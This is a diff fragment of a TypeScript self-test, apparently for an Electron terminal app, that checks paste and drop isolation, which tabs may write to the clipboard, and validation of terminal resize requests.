+      for (const [keyCode, modifiers] of [['V', ['control']], ['V', ['control', 'shift']], ['Insert', ['shift']]] as [string, ('control' | 'shift')[]][]) {
+        t.view.webContents.sendInputEvent({ type: 'keyDown', keyCode, modifiers });
+        t.view.webContents.sendInputEvent({ type: 'keyUp', keyCode, modifiers });
+      }
+      t.view.webContents.paste();
+      await js(t.view, `(() => { const el = document.querySelector('#term textarea'); for (const type of ['paste', 'drop']) { const d = new DataTransfer(); d.setData('text/plain', 'echo this-came-from-the-clipboard'); el.dispatchEvent(type === 'paste' ? new ClipboardEvent('paste', { clipboardData: d, bubbles: true, cancelable: true }) : new DragEvent('drop', { dataTransfer: d, bubbles: true, cancelable: true })); } })()`);
+      const afterPaste = await boxGot();
+      check('no paste key, no menu paste and no drop puts the clipboard on the box (paste will be main\'s, not the terminal\'s)', !afterPaste.includes('clipboard') && afterPaste.replace(/\x16/g, '') === '', JSON.stringify(afterPaste));
+
+      // Select to copy: only the tab in front of the window in use may leave text on the clipboard.
+      clipboard.writeText('untouched');
+      await js(a.view, `window.tabPort.copy('from a tab that is not in front')`);
+      await sleep(150);
+      check('a tab that is not in front cannot put text on the clipboard', (await clipboard.readText()) === 'untouched', await clipboard.readText());
+      // The tab in front can, and the window says what was copied; not while a dialog or menu is over it; and
+      // never more than the limit.
+      const frontTab = ctx.tabs.get(ctx.shellState().active)!;
+      ctx.win.focus();
+      await sleep(150);
+      await js(ctx.shell, `window.shellPort.cmd({ op: 'overlay', on: true })`);
+      await js(frontTab.view, `window.tabPort.copy('from under a dialog')`);
+      await sleep(150);
+      const underDialog = await clipboard.readText();
+      await js(ctx.shell, `window.shellPort.cmd({ op: 'overlay', on: false })`);
+      const droppedBeforeCopy = ctx.dropped();
+      await js(frontTab.view, `window.tabPort.copy('x'.repeat(${COPY_MAX} + 1))`);
+      await sleep(400);
+      const tooMuch = await clipboard.readText();
+      refusedByTheLock++;
+      check('a tab under a dialog cannot either; and more than the limit at once is refused whole', underDialog === 'untouched' && tooMuch === 'untouched' && ctx.dropped() === droppedBeforeCopy + 1, [underDialog.slice(0, 40), tooMuch.length, ctx.dropped() - droppedBeforeCopy]);
+      await js(frontTab.view, `window.tabPort.copy('one\\ntwo')`);
+      await sleep(250);
+      check('the tab in front of the window in use can: the text is on the clipboard, and the window says what was copied', (await clipboard.readText()) === 'one\ntwo' && (await text('#status')).includes('Copied 2 lines'), [await clipboard.readText(), await text('#status'), ctx.win.isFocused()]);
+      // A size that is none (no cells, absurdly many, not a number) is refused and never reaches the box.
+      const droppedBeforeSize = ctx.dropped();
+      const askedBefore = JSON.stringify(((await lab.tell('seen'))['sessions'] as { Asked?: string[] }[]).map((x) => x.Asked));
+      await js(t.view, `(window.tabPort.resize(0, 40), window.tabPort.resize(80, 99999), window.tabPort.resize('wide', 24), window.tabPort.resize(80.5, 24))`);
+      await sleep(300);
+      refusedByTheLock += 4;
+      const askedAfter = JSON.stringify(((await lab.tell('seen'))['sessions'] as { Asked?: string[] }[]).map((x) => x.Asked));
+      check('a terminal size that is none is refused, and the box is told nothing', ctx.dropped() === droppedBeforeSize + 4 && askedAfter === askedBefore, [ctx.dropped() - droppedBeforeSize, askedAfter]);
+      await lab.tell('quiet off');
 
       // The key process signs a sign-in for its own box and user, and nothing else, whoever asks.
       const data = signInData('demo', box().publicKey);
@@ -852,7 +1123,7 @@ export async function runSelfTest(ctx: Ctx): Promise<void> {
     }
 
     check('no view ever reached the canary web server', canaryHits === 0, canaryHits);
-    check(`no message was dropped, but the ones the lock refused on purpose (late from a closed view, not acted on: ${ctx.lateFromClosed()})`, ctx.dropped() === refusedByTheLock, [ctx.dropped(), refusedByTheLock, ctx.droppedOn()]);
+    check(`no message was dropped, but the ones refused on purpose (late from a closed view, not acted on: ${ctx.lateFromClosed()})`, ctx.dropped() === refusedByTheLock, [ctx.dropped(), refusedByTheLock, ctx.droppedOn()]);
   } catch (err) {
     check('no probe threw', false, err instanceof Error ? (err.stack ?? err.message) : String(err));
   }
